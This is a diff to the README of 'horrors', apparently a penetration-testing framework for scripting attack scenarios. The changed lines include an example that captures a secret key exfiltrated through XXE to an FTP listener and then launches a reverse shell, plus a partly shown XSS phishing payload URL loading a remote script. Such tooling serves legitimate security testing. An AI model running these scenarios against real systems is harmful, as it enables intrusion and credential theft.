@@ -27,9 +27,7 @@ context = {
 ftpd = services.FTPReader()
 ftpd.add_event('xxe', when=events.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))
 
-story = scenarios.Scenario(**context)
-story.set_debug()
-story.set_proxy('http://127.0.0.1:8080')
+story = scenarios.Scenario(context=context, debug=True, http_proxy='http://127.0.0.1:8080')
 story.add_service(ftpd)
 story.add_scene(ReverseShell, when='xxe')
 story.play()
@@ -37,8 +35,7 @@ story.play()
 
 ## Installation
 
-    $ git clone https://github.com/tasooshi/horrors
-    $ cd horrors; pip3 install .
+    $ pip3 install git+https://github.com/tasooshi/horrors
 
 ## Example
 
@@ -63,9 +60,13 @@ Now visit `http://127.0.0.1:8008/?message=<script src="http://127.0.0.1:8888/fak
 
 ![xssphish](examples/xssphish/dom-based-xss-phish.jpg)
 
-
 ## Changelog
 
+* **2021/12/23** Getting production ready (v0.6)
+    * Major refactoring and backward incompatible changes
+    * Added unit tests
+    * Replaced Flask with Sanic framework
+    * Scenes are now class-based
 * **2021/12/14** Beta (v0.5)
     * Improved HTTP proxy logic
 * **2021/12/12** Beta (v0.4)
